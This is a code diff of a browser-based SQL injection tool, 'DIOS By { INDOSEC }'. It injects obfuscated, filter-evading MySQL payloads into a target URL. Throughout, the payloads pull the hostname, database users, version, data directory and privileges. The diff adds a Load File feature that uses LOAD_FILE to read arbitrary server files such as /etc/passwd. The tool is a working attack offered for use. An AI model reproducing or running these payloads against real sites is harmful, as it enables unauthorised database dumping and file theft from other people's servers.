@@ -1,29 +1,55 @@
 $(document).ready(function () {
-    let urls = ""
-    let databases = ""
-    let tables = ""
-    let columns = ""
-    let database_select = ""
-    let table_select = ""
-    let columns_select = ""
+    let {
+        urls,
+        databases,
+        tables,
+        columns,
+        database_select,
+        table_select,
+        columns_select,
+        UUID,
+        hostname,
+        currentDB,
+        user,
+        CurrentUser,
+        os,
+        version,
+        port,
+        dataDir,
+        TempDirectory,
+        BITSDETAILS,
+        FILESYSTEM,
+        symlink,
+        ssl,
+        privilage,
+        files_loadfile
+    } = ""
+
     let res_thead = '<thead class="bg-gray-50" id="thead_template"></thead>'
     let res_tbody = '<tbody class="bg-white divide-y divide-gray-200" id="tbody_template"></tbody>'
 
-    document.title = "DIOS By { INDOSEC }";
+    document.title = ".:: DIOS By { INDOSEC } ::.";
     
     function importcss(link) {
-        let links   = document.createElement('link')
-        links.rel   = 'stylesheet'
-        links.href  = link
+        let links = document.createElement('link')
+        links.rel = 'stylesheet'
+        links.href = link
         document.head.appendChild(links);
     }
 
-    function importjs(link) {
-        let script      = document.createElement('script')
-        script.type     = "text/javascript"
-        script.src      = link
-        script.async    = true
+    function importjs(link, async = false) {
+        let script = document.createElement('script')
+        script.type = "text/javascript"
+        script.src = link
+        script.async = (async) ? true : false
         document.head.appendChild(script)
+    }
+
+    function addMeta(httpequiv, content) {
+        var meta = document.createElement('meta');
+        meta.httpEquiv = httpequiv;
+        meta.content = content;
+        document.getElementsByTagName('head')[0].appendChild(meta);
     }
 
     function stringtochar(string) {
@@ -46,14 +72,16 @@ $(document).ready(function () {
         return $.ajax({
             url: url,
             success: function(data) {
-                return data;
+                return data
             }        
-        });
+        })
     }
 
-    function regexs(output) {
-        const regex = /<inject>(.*?)<\/inject>/g
-        match = regex.exec(output)
+    function regexs(output, outfile = false) {    
+        let regex = (outfile) ? /(?<=<inject>)(.|\n)+(?=<\/inject>)/g : /<inject>(.*?)<\/inject>/g
+        let match = regex.exec(output)
+
+        if (outfile) return match[0]
         return match[1]
     }
 
@@ -64,9 +92,36 @@ $(document).ready(function () {
     function PayloadConcat(string) {
         return `/*!50000%43o%4Ec%41t/**12345**/(${stringtohex('<inject>')},unhex(hex(/*!50000Gr%6fuP_c%6fnCAT(${string}))),${stringtohex("</inject> <!--")})*/`
     }
-    
-    importcss("https://unpkg.com/tailwindcss@2.0.2/dist/tailwind.min.css")
-    importjs("https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js")
+
+    let linkcss = [
+        "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.59.1/codemirror.min.css",
+        "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.59.1/theme/monokai.min.css",
+        "https://unpkg.com/tailwindcss@2.0.2/dist/tailwind.min.css"
+    ]
+
+    let linkjs = [
+        ["https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js", true],
+        ["https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.59.1/codemirror.min.js", false],
+        ["https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.59.1/mode/php/php.min.js", false],
+        ["https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.59.1/mode/clike/clike.min.js", false],
+        ["https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.59.1/mode/css/css.min.js", false],
+        ["https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.59.1/mode/javascript/javascript.min.js", false],
+        ["https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.59.1/mode/xml/xml.min.js", false],
+        ["https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.59.1/mode/htmlmixed/htmlmixed.min.js", false],
+        ["https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.59.1/addon/edit/matchbrackets.min.js", false],
+    ]
+
+    linkcss.forEach(link => {
+        importcss(link)
+    })
+
+    linkjs.forEach(link => {
+        importjs(link[0], link[1])
+    })
+
+    addMeta('cache-control', 'no-cache')
+    addMeta('expires', '0')
+    addMeta('pragma', 'no-cache')
 
     async function setUrl() {
         const {
@@ -91,12 +146,12 @@ $(document).ready(function () {
         let template = `
     <style>
         tr:nth-child(even) {
-            --tw-bg-opacity: 1 !important;
-            background-color: rgba(229,231,235,var(--tw-bg-opacity)) !important;
+            --tw-bg-opacity: 1;
+            background-color: rgba(229,231,235,var(--tw-bg-opacity));
         }
         tr:hover {
-            --tw-bg-opacity: 1 !important;
-            background-color: rgba(209, 213, 219, var(--tw-bg-opacity)) !important;
+            --tw-bg-opacity: 1;
+            background-color: rgba(209, 213, 219, var(--tw-bg-opacity));
         }
     </style>
     <div class="container mx-auto">
@@ -114,13 +169,15 @@ $(document).ready(function () {
         <div id="click-menu" class="inline-flex mx-auto">
             <a id="getInfo" class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 border border-blue-700 rounded mx-2 my-3 transform hover:scale-110 motion-reduce:transform-none">Get Information Gathering</a>
             <a id="getData" class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 border border-blue-700 rounded mx-2 my-3 transform hover:scale-110 motion-reduce:transform-none">Get Data</a>
-            <!-- <a id="LoadFile" class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 border border-blue-700 rounded mx-2 my-3 transform hover:scale-110 motion-reduce:transform-none">Load File</a> -->
+            <a id="loadFile" class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 border border-blue-700 rounded mx-2 my-3 transform hover:scale-110 motion-reduce:transform-none">Load File</a>
         </div>
     </div>
     
     <div class="container mx-auto mt-4">
         <ul class="flex w-full text-gray-500 text-sm lg:text-base bg-white p-3 rounded-md mb-3" id="menuscontrol"></ul>
-        <div class="flex flex-col">
+        <div id="form_loadfile" class="mx-auto">
+        </div>
+        <div class="flex flex-col" id="infos">
             <div class="-my-2 overflow-x-auto sm:-mx-6 lg:-mx-8">
                 <div class="py-2 align-middle inline-block min-w-full sm:px-6 lg:px-8">
                     <div class="shadow overflow-hidden border-b border-gray-200 sm:rounded-lg">
@@ -132,11 +189,9 @@ $(document).ready(function () {
                         </table>
                         <table class="min-w-full divide-y divide-gray-200" id="output_info">
                             <thead class="bg-gray-50">
-                                <tr>
-                                    <th scope="col" colspan="2" class="px-6 py-3 text-center text-xs font-medium text-gray-500 uppercase tracking-wider">
-                                        Information Gathering
-                                    </th>
-                                </tr>
+                                <th scope="col" colspan="2" class="px-6 py-3 text-center text-xs font-medium text-gray-500 uppercase tracking-wider">
+                                    Information Gathering
+                                </th>
                             </thead>
                             <tbody class="bg-white divide-y divide-gray-200">
                                 <tr>
@@ -252,6 +307,7 @@ $(document).ready(function () {
                 </div>
             </div>
         </div>
+        <div class="text-white text-center mt-3 mb-3">Create By  Rizsyad AR</div>
     </div>`
 
         $("body").html(template)
@@ -260,6 +316,7 @@ $(document).ready(function () {
             $("#time").html(moment().format('LL, hh:mm:ss a'))
         },1000)
 
+        $("#form_loadfile").hide()
         $("#output_info").hide()
         $("#menuscontrol").hide()
 
@@ -267,13 +324,31 @@ $(document).ready(function () {
         await setDatabase()
 
         $("#getInfo").on('click', function() {
+            $("#form_loadfile").hide()
             $("#output").hide()
             $("#output_info").show()
+            $("#infos").show()
         })
 
         $("#getData").on('click', function() {
+            $("#form_loadfile").hide()
+            $("#infos").show()
             $("#output").show()
             $("#output_info").hide()
+        })
+
+        $("#loadFile").on('click', function() {
+            if(/YES/.test(privilage)) {
+                loadFile()
+                $("#form_loadfile").show()
+                $("#infos").hide()
+            } else {
+                Swal.fire({
+                    title: 'Error!',
+                    text: 'The target has not vuln loadfile!',
+                    icon: 'error',
+                })
+            }
         })
 
     }
@@ -281,21 +356,21 @@ $(document).ready(function () {
     async function getInfo() {
         let urlinject = urls
 
-        let UUID = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('UUID/**INDOSEC**/()'))))
-        const hostname = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@hostname'))))
-        const currentDB = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('database/**INDOSEC**/()'))))
-        const user = await regexs(await request(await replaceText(urlinject, '{::}', PayloadConcat('user/**INDOSEC**/()'))))
-        const CurrentUser = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('current_user/**INDOSEC**/()'))))
-        const os = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!00000@@version_compile_os'))))
-        const version = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@version'))))
-        const port = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@port'))))
-        const dataDir = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!00000@@datadir'))))
-        const TempDirectory = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@tmpdir'))))
-        const BITSDETAILS = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@version_compile_machine'))))
-        const FILESYSTEM = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@CHARACTER_SET_FILESYSTEM'))))
-        const symlink = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!00000@@GLOBAL.have_symlink'))))
-        const ssl = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!00000@@GLOBAL.have_ssl'))))
-        const privilage = await regexs(await replaceText(await request(await replaceText(urlinject, '{::}', PayloadConcat('(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES)'))), /,/gm,""))
+        UUID = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('UUID/**INDOSEC**/()'))))
+        hostname = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@hostname'))))
+        currentDB = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('database/**INDOSEC**/()'))))
+        user = await regexs(await request(await replaceText(urlinject, '{::}', PayloadConcat('user/**INDOSEC**/()'))))
+        CurrentUser = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('current_user/**INDOSEC**/()'))))
+        os = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!00000@@version_compile_os'))))
+        version = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@version'))))
+        port = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@port'))))
+        dataDir = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!00000@@datadir'))))
+        TempDirectory = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@tmpdir'))))
+        BITSDETAILS = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@version_compile_machine'))))
+        FILESYSTEM = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@CHARACTER_SET_FILESYSTEM'))))
+        symlink = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!00000@@GLOBAL.have_symlink'))))
+        ssl = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!00000@@GLOBAL.have_ssl'))))
+        privilage = await regexs(await replaceText(await request(await replaceText(urlinject, '{::}', PayloadConcat('(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES)'))), /,/gm,""))
 
         let arr = ['UUID','hostname','currentDB','user','CurrentUser','os','version','port','dataDir','TempDirectory','BITSDETAILS','FILESYSTEM','symlink','ssl','privilage']
 
@@ -527,5 +602,40 @@ $(document).ready(function () {
         }
         $("#tbody_template").append(template_tbodys)
     }
+
+    async function loadFile() {
+        $("#form_loadfile").html(`
+        <div class="grid grid-cols-1 w-full">
+            <span class="text-white mr-4">File: </span>
+            <input id="file_loadfile" class="rounded form-input w-full mt-1 block p-1" placeholder="/etc/passwd" />
+        </div>
+        <div class="grid grid-cols-1 w-full mt-2">
+            <span class="text-white mr-4">Output: </span>
+            <textarea id="output_loadfile"></textarea>
+        </div>
+        <div class="grid grid-cols-1 w-full mt-4">
+            <button id="view_loadfile" class="bg-blue-500 hover:bg-blue-400 text-white font-bold py-2 px-4 border-b-4 border-blue-700 hover:border-blue-500 rounded transform hover:scale-110 motion-reduce:transform-none">
+                View File
+            </button>
+        </div>
+        `)
+
+        var editor = await CodeMirror.fromTextArea($("#output_loadfile")[0], {
+            lineNumbers: true,
+            matchBrackets: true,
+            mode: "application/x-httpd-php",
+            indentUnit: 4,
+            indentWithTabs: true,
+            theme: 'monokai'
+        })
+
+        $("#view_loadfile").on('click', async function() {
+            let urlinject = urls
+            files_loadfile = stringtohex($("#file_loadfile").val())
+            let outpus = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat(`/*!12345%4co%41d_%46i%4ce/**INDOSEC**/(${files_loadfile})`))), true)
+            editor.setValue(outpus)
+        })
+    }
+
     setUrl()
-});
+})
